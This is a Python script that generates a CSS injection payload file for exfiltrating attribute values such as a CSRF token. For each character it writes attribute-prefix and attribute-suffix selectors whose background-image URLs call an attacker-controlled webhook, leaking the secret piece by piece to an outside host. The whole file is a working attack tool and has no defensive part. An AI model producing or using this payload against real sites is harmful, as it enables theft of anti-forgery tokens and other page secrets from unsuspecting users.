#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import string
import urllib.parse

# All needed user inputs -- comment these lines and define the values yourself below for execution without input
#"""
webhook = input("Webhook URI (ex:  <https://cssexfil.free.beeceptor.com/?v=> ) : ")
css_selector = input("CSS base selector (ex:<input[name=csrf]>) : ")
attr = input("Attribute to exfiltrate (ex:<value>) : ")
attr_start = input("Known attribute beginning (ex:<abc>) : ")
attr_end = input("Known attribute ending (ex:<abc>) : ")
#"""

# OR define needed variables yourself : 
"""
webhook = ""
css_selector = ''
attr = ""
attr_start = ""
attr_end = ""
"""

# additionnal chars not in [A-Za-z0-9] ex : other_chars = "<>:~&+(){}[]_-.#@^$=%£¤*!"
other_chars = ""

char_list = other_chars + string.ascii_lowercase + string.ascii_uppercase + string.digits

f = open("cssexfil.css", "w")


for c in char_list:
    f.write(f'{css_selector}[{attr}^="{attr_start}{c}"]{{background-image: url("{webhook}{urllib.parse.quote_plus(attr_start)}{urllib.parse.quote_plus(c)}_");}}\n')
    f.write(f'{css_selector}[{attr}$="{c}{attr_end}"] ~ *{{background-image: url("{webhook}_{urllib.parse.quote_plus(c)}{urllib.parse.quote_plus(attr_end)}");}}\n')

# Note: changing background 2 times on the same element didn't work in my case, so -value ending- selectors apply the background rule to a sibling with <] ~ *>